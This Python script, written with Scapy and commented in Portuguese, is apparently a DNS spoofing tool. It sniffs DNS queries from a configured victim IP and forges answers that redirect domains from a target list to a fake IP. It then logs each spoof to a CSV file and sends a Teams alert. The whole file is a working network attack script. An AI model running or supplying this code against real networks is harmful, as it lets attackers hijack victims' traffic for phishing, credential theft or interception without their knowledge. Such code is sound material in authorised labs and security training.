from scapy.all import *
from config import VICTIM_IP, INTERFACE, FAKE_IP, DOMAINS_FILE
import csv
import datetime
import teams_alert

def spoof_dns(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        domain = packet[DNSQR].qname.decode().strip('.')
        real_ip = packet[IP].src  # IP da máquina que fez a consulta
        
        with open(DOMAINS_FILE) as f:
            spoof_domains = [d.strip() for d in f.readlines()]
        
        for target in spoof_domains:
            if target in domain:
                spoofed_pkt = IP(dst=real_ip, src=packet[IP].dst) / \
                              UDP(dport=packet[UDP].sport, sport=53) / \
                              DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                  an=DNSRR(rrname=domain + '.', ttl=300, rdata=FAKE_IP))
                send(spoofed_pkt, verbose=0)
                now = datetime.datetime.now()
                
                # Registrar CSV com o IP real incluído
                with open("logs/spoof_log.csv", "a", newline='') as log:
                    writer = csv.writer(log)
                    writer.writerow([now, domain, FAKE_IP, real_ip])
                
                # Enviar alertas incluindo o IP real
                alert_msg = f"Spoofed: {domain} → {FAKE_IP} (Consulta de {real_ip})"
                teams_alert.send_teams_alert(domain, FAKE_IP, real_ip)
                break

def start_sniffing():
    sniff(filter=f"udp port 53 and ip src {VICTIM_IP}", iface=INTERFACE, prn=spoof_dns, store=0)
